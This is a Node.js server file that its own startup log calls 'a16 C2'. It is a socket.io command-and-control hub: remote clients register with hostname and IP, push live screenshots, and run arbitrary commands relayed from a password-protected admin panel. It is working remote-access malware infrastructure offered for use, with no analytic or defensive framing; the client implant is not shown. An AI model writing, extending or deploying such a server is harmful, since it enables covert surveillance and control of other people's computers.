// server.js
const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const fs = require('fs');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: { origin: '*' } // restrict in production
});

// Cloudflare Secret – set env vars in Cloudflare Pages or your host
const VALID_USERNAME = process.env.A16_USERNAME || 'admin';
const VALID_PASSWORD = process.env.A16_PASSWORD || 'changeme';

// Serve static files
app.use(express.static('public'));
app.use(express.json());

// Authentication endpoint
app.post('/login', (req, res) => {
    const { username, password } = req.body;
    if (username === VALID_USERNAME && password === VALID_PASSWORD) {
        res.json({ success: true });
    } else {
        res.status(401).json({ success: false });
    }
});

// In-memory client store
const clients = new Map(); // guid -> { socket, hostname, ip, lastSeen, status, screenshot, ... }

io.on('connection', (socket) => {
    console.log('New connection:', socket.id);

    socket.on('register', (data) => {
        const { guid, hostname, ip } = data;
        clients.set(guid, {
            socket,
            hostname,
            ip,
            lastSeen: Date.now(),
            status: 'online',
            screenshot: null // base64
        });
        // Broadcast updated client list to all admin panels
        io.emit('client_list', Array.from(clients.values()).map(c => ({
            guid: c.guid || 'unknown',
            hostname: c.hostname,
            ip: c.ip,
            status: c.status,
            screenshot: c.screenshot
        })));
    });

    socket.on('screenshot', (data) => {
        const { guid, image } = data;
        const client = clients.get(guid);
        if (client) {
            client.screenshot = image;
            client.lastSeen = Date.now();
            // Broadcast to all admins
            io.emit('client_update', { guid, screenshot: image, lastSeen: client.lastSeen });
        }
    });

    socket.on('client_response', (data) => {
        const { guid, requestId, result } = data;
        // Forward response to the specific admin session that asked for it
        // We'll use a simple event: admin sends requestId and listens for response
        io.to(socket.id).emit('command_response', { requestId, result });
    });

    // Handle commands from admin panel
    socket.on('command', (data) => {
        const { guid, type, payload, requestId } = data;
        const target = clients.get(guid);
        if (target && target.socket) {
            target.socket.emit('command', { type, payload, requestId });
        } else {
            socket.emit('command_response', { requestId, error: 'Client offline' });
        }
    });

    socket.on('disconnect', () => {
        // Mark clients as offline
        for (let [guid, client] of clients) {
            if (client.socket.id === socket.id) {
                client.status = 'offline';
                io.emit('client_update', { guid, status: 'offline' });
            }
        }
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`a16 C2 running on port ${PORT}`));
